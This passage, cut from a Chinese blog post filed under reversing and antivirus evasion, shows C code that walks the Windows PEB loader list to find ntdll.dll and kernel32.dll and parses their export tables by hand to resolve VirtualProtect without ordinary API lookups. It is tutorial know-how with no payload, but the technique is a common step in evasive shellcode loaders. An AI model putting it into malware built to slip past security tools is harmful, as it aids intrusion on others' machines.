pFile = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptional = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = <span class="literal">NULL</span>;</span><br><span class="line">PMPEB peb = (PMPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">PLDR_DATA_TABLE_ENTRY64 pLdr = <span class="literal">NULL</span>;</span><br><span class="line">PBYTE imageBase = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use PEB to find the base address of ntdll.dll</span></span><br><span class="line">pLdr = (PLDR_DATA_TABLE_ENTRY64)((PBYTE)peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink - <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]name:%s\n&quot;</span>, pLdr-&gt;BaseDllName.Buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]DllBase:%p\n&quot;</span>, (PBYTE)pLdr-&gt;DllBase);</span><br><span class="line"><span class="keyword">while</span> ((_wcsicmp(pLdr-&gt;BaseDllName.Buffer, <span class="string">L&quot;ntdll.dll&quot;</span>)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pLdr = (PLDR_DATA_TABLE_ENTRY64)((PBYTE)pLdr-&gt;InMemoryOrderLinks.Flink - <span class="number">0x10</span>);</span><br><span class="line">imageBase = (PBYTE)pLdr-&gt;DllBase;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]name: %s\n&quot;</span>,pLdr-&gt;BaseDllName.Buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]DllBase: %p\n&quot;</span>, imageBase);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]find ntdll.dll address.....\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// find the exported functions of ntdll.dll</span></span><br><span class="line">pDos = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line"><span class="keyword">if</span> (*(PWORD)pDos != <span class="number">0x5A4D</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]pe parsing failed..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pOptional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)pDos + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(DWORD) + <span class="built_in">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + pOptional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(imageBase + pExport-&gt;AddressOfFunctions));</span><br><span class="line">PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)imageBase + pExport-&gt;AddressOfNames);</span><br><span class="line">PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)imageBase + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; pExport-&gt;NumberOfNames; cx++)</span><br><span class="line">&#123;</span><br><span class="line">PCHAR pczFunctionName = (PCHAR)((PBYTE)imageBase + pdwAddressOfNames[cx]);</span><br><span class="line">PVOID pFunctionAddress = (PBYTE)imageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="直接利用偏移："><a href="#直接利用偏移：" class="headerlink" title="直接利用偏移："></a>直接利用偏移：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;getPeb.h&quot;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// custom VirtualProtect function</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* CustomVirtualProtect)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)</span></span>;</span><br><span class="line">CustomVirtualProtect myVirtualProtect;</span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">GetFunctionAddress</span><span class="params">(PVOID pBaseAddress, PCHAR pFunctionName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_FILE_HEADER pFile = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptional = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = <span class="literal">NULL</span>;</span><br><span class="line">PVOID getFunctionAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">pDos = (PIMAGE_DOS_HEADER)pBaseAddress;</span><br><span class="line"><span class="keyword">if</span> (*(PWORD)pDos != <span class="number">0x5A4D</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]pe parsing failed..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pOptional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)pDos + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(DWORD) + <span class="built_in">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pBaseAddress + pOptional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pBaseAddress + pExport-&gt;AddressOfFunctions);</span><br><span class="line">PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pBaseAddress + pExport-&gt;AddressOfNames);</span><br><span class="line">PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pBaseAddress + pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; pExport-&gt;NumberOfNames; cx++)</span><br><span class="line">&#123;</span><br><span class="line">PCHAR pczFunctionName = (PCHAR)((PBYTE)pBaseAddress + pdwAddressOfNames[cx]);</span><br><span class="line">PVOID pFunctionAddress = (PBYTE)pBaseAddress + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == _strnicmp(pczFunctionName, pFunctionName, <span class="built_in">strlen</span>(pczFunctionName)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">getFunctionAddress = pFunctionAddress;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> getFunctionAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID64 peb = <span class="built_in">GetPeb64</span>();</span><br><span class="line">PVOID64 PEB_LDR_DATA = *(PVOID64**)((PBYTE)peb + <span class="number">0x18</span>);</span><br><span class="line">PVOID64 PEB_LDR_TABLE_ENTRY = (PVOID64)((PBYTE)PEB_LDR_DATA + <span class="number">0x20</span>);</span><br><span class="line">UNICODE_STRING* fullName = <span class="literal">NULL</span>;</span><br><span class="line">LIST_ENTRY* pListEntry = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hKernel32 = <span class="literal">NULL</span>;</span><br><span class="line">PVOID apiID = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">pListEntry = (LIST_ENTRY*)PEB_LDR_TABLE_ENTRY;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">pListEntry = pListEntry-&gt;Flink;</span><br><span class="line">fullName = (UNICODE_STRING*)((PBYTE)pListEntry + <span class="number">0x48</span>);</span><br><span class="line">hKernel32 = (HMODULE)(*((PULONG64)((PBYTE)pListEntry + <span class="number">0x20</span>)));</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]moduleNaame: %s\n&quot;</span>, fullName-&gt;Buffer);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]moduleAddress: %p\n&quot;</span>, hKernel32);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ((_wcsicmp(fullName-&gt;Buffer, <span class="string">L&quot;kernel32.dll&quot;</span>)) != <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;find address....\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">apiID = <span class="built_in">GetFunctionAddress</span>((PVOID)hKernel32, (PCHAR)<span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">myVirtualProtect = (CustomVirtualProtect)(DWORD)apiID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意事项：取值时要注意是指针还是二重指针，数据宽度要注意</p><p>参考文章：</p><ul><li><a href="https://bbs.kanxue.com/thread-266678.htm">https://bbs.kanxue.com/thread-266678.htm</a></li><li><a href="http://www.youngroe.com/2015/08/01/Debug/peb-analysis">http://www.youngroe.com/2015/08/01/Debug/peb-analysis</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向免杀 </tag>
            
            <tag> peb </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
